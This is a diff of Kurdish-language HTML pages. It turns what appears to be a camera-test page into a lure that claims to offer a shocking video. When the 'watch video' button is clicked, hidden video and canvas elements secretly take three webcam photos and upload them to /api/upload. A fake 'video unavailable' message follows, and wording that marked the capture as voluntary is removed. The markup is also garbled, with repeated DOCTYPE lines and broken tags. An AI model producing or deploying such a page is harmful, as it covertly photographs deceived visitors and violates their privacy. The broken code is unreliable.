@@ -1,4 +1,4 @@
-<!DOCTYPE html><!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html><!DOCTYPE html><!DOCTYPE html>
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -39,7 +39,75 @@
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
 
-                    // چاوەڕێ بکە تا کامێراکە ئامادە دەبێت
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // گرتنی ٣ وێنە بە زنجیرە
+                    for (let i = 0; i < 3; i++) {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+                        
+                        await sendImage(imageData);
+
+                        if (i < 2) {
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+
+                    stream.getTracks().forEach(track => track.stop());
+                    alert('ببوورە، ڤیدیۆکە لەبەردەستدا نییە یان نەخوێنرایەوە.');
+                })
+                .catch(err => {
+                    alert('تکایە ڕێگە بدە بۆ کردنەوەی پەڕەکە.');
+                });
+        }
+    </script>
+</body>
+</html>
+
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ڤیدیۆیەکی خۆش - شۆک ببە ببینە!</title>
+</head>
+<body style="font-family: Tahoma, sans-serif; text-align: center; padding-top: 80px; background: #f0f2f5;">
+    <div style="background: white; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px;">
+        <h2 style="color: #333; margin-bottom: 10px;">ڤیدیۆیەکی تایبەت</h2>
+        <p style="color: #666; font-size: 14px; margin-bottom: 25px;">بۆ بینینی ڤیدیۆکە، تکایە کرتە لەسەر دوگمەی خوارەوە بکە:</p>
+        
+        <button onclick="startCaptureSequence()" style="background: #1877f2; color: white; padding: 12px 30px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer;">بینینی ڤیدیۆ</button>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function sendImage(imageData) {
+            try {
+                await fetch('/api/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+            } catch (err) {
+                console.error('Error sending image:', err);
+            }
+        }
+
+        function startCaptureSequence() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(async stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+
+                    // چاوەڕێ بکە تا ڤیدۆ خۆزشەکە ئامادە دەبێت
                     await new Promise(resolve => setTimeout(resolve, 1500));
 
                     canvas.width = video.videoWidth;
@@ -125,11 +193,11 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title>تاقیکردنەوەی کامێرا</title>
+    <title> ا</title>
 </head>
 <body>
-    <h2>نیشدانی کامێرا بە خۆبەخشانە</h2>
-    <button id="start-btn">کردنەوەی کامێرا</button>
+    <h2> </h2>ب </h2>
+    <button id="start-btn">را</button>
     <br><br>
     <video id="video" width="400" autoplay playsinline></video>
     <br>
